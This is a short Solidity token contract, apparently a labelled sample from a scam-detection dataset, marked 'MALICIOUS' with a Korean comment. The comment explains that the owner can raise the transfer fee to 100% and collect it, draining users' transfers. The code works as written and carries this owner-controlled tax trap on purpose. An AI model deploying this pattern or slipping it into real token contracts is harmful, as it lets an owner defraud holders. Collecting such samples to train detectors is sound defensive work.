// SPDX-License-Identifier: MIT
// LABEL: MALICIOUS
//
// 소유자가 feeBps를 최대 10000(100%)까지 설정할 수 있고 수수료는 owner에게 귀속됩니다. 사용자의 전송 가치를 사실상 전부 빼앗을 수 있습니다.
pragma solidity ^0.8.20;

contract DynamicTaxTrap {
    address public owner;
    uint256 public feeBps;
    mapping(address => uint256) public balanceOf;

    constructor(uint256 supply) {
        owner = msg.sender;
        balanceOf[msg.sender] = supply;
    }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function setFee(uint256 newFeeBps) external onlyOwner {
        require(newFeeBps <= 10000, "range");
        feeBps = newFeeBps;
    }

    function transfer(address to, uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "balance");
        uint256 fee = amount * feeBps / 10000;
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount - fee;
        balanceOf[owner] += fee;
    }
}
